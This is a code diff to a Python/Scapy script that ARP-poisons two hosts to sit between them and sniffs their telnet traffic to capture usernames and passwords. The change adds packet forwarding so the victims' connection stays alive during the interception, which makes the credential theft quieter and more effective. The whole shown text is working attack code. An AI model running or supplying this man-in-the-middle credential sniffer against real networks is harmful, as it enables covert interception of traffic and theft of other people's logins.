@@ -42,8 +42,22 @@ def mitm():
     poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
     
 
-def is_raw_frame(pckt):
+def is_telnet_traffic(pckt):
     return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == hostB_IP or pckt[IP].src == hostB_IP)
+
+def forward_packet(pckt):
+    if pckt.haslayer(IP):
+        # Forward packet to its intended destination
+        if pckt[IP].dst == hostA_IP:
+            # Packet going to Host A, set correct MAC
+            pckt[Ether].dst = hostA_MAC
+        elif pckt[IP].dst == hostB_IP:
+            # Packet going to Host B, set correct MAC  
+            pckt[Ether].dst = hostB_MAC
+        
+        # Set source MAC to attacker MAC (we're the relay)
+        pckt[Ether].src = attacker_MAC
+        sendp(pckt, iface=interface, verbose=False)
 
 def print_user_pass():
     u = "".join(username)
@@ -53,6 +67,10 @@ def print_user_pass():
 
 def print_pckt(pckt):
     global username, password, return_cnt, credentials_captured
+    
+    # Forward the packet first to keep connection alive
+    forward_packet(pckt)
+    
     if credentials_captured:
         return
     
@@ -91,4 +109,4 @@ if __name__ == "__main__":
     
     # Step 4: Start sniffing telnet traffic
     print("Step 4: Sniffing telnet traffic...")
-    sniff(iface=interface, lfilter=is_raw_frame, prn=print_pckt)
+    sniff(iface=interface, lfilter=is_telnet_traffic, prn=print_pckt)
